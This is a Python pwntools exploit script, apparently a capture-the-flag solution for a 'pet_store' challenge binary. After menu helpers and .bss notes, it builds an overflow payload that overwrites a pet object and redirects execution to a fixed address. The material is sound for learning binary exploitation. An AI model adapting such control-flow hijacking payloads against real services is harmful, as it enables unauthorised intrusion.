#!/usr/bin/env python3
from pwn import *

elf = ELF('./pet_store')
# libc = ELF('./libc.so.6')
# ld = ELF('./ld-2.35.so')
context.update(binary=elf, log_level='DEBUG')
# p = elf.process()
p = gdb.debug('./pet_store', '''
    b *main+235
    b *main+247
    b *main+259
    b *main+271
    b *main+283
    b *main+295
''')
# p = remote("172.16.0.250", "11501")

# b *main+235
def buy_pet(idx):
    p.sendlineafter(b">> ", b"1")
    p.sendlineafter(b">> ", str(idx + 1).encode())
    return

# b *main+247
def show_pet_info(idx):
    p.sendlineafter(b">> ", b"2")
    p.sendlineafter(b"Pet idx: ", str(idx).encode())
    info = p.recvlines(4)
    print(info)
    return 

# b *main+259
def name_pet(idx, pet_name):
    p.sendlineafter(b">> ", b"3")
    p.sendlineafter(b"Pet idx: ", str(idx).encode())
    p.sendlineafter(b"name: \n", pet_name)
    return

# b *main+271
def feed_pet(idx):
    p.sendlineafter(b">> ", b"4")
    p.sendlineafter(b"feed: ", str(idx).encode())
    return

# b *main+283
def talk_with_pet(idx, msg, new_sound = b''):
    p.sendlineafter(b">> ", b"5")
    p.sendlineafter(b"talk with: ", str(idx).encode())
    p.sendlineafter(b"your pet: \n", msg)
    # p.sendlineafter(b"[y/n]: ", b"y")
    p.sendlineafter(b"[y/n]: ", b"n")
    # p.sendlineafter(b"new sound: ", new_sound)
    return

# b *main+295
def release_pet(idx):
    p.sendlineafter(b">> ", b"6")
    p.sendlineafter(b"release: ", str(idx).encode())
    return 

name = b""
name += p64(0x4040e8) + p64(0x2a662065726f6d)
p.sendlineafter(b"name: ", name)


# puts("1. Dog");
# puts("2. Cat");
# puts("3. Bird");

# .bss:00000000004040E0 ; char name[64]
# .bss:00000000004040E0 name            db 40h dup(?)

# .bss:0000000000404120 ; _QWORD pets[8]
# .bss:0000000000404120 pets            dq 8 dup(?)

# .bss:0000000000404160 ; unsigned int pet_types[8]
# .bss:0000000000404160 pet_types       dd 8 dup(?)


# create pet 
gdb.attach(p, '''
    b *main+235
    b *main+247
    b *main+259
    b *main+271
    b *main+283
    b *main+295
''')
buy_pet(0)
feed_pet(0)
payload = b""
payload += p64(0x2b6f59ca7ab8aca1) * 19
payload += p64(0)
payload += p64(0x4040e8) + p64(0x4012e6)

talk_with_pet(0, payload)


p.interactive()



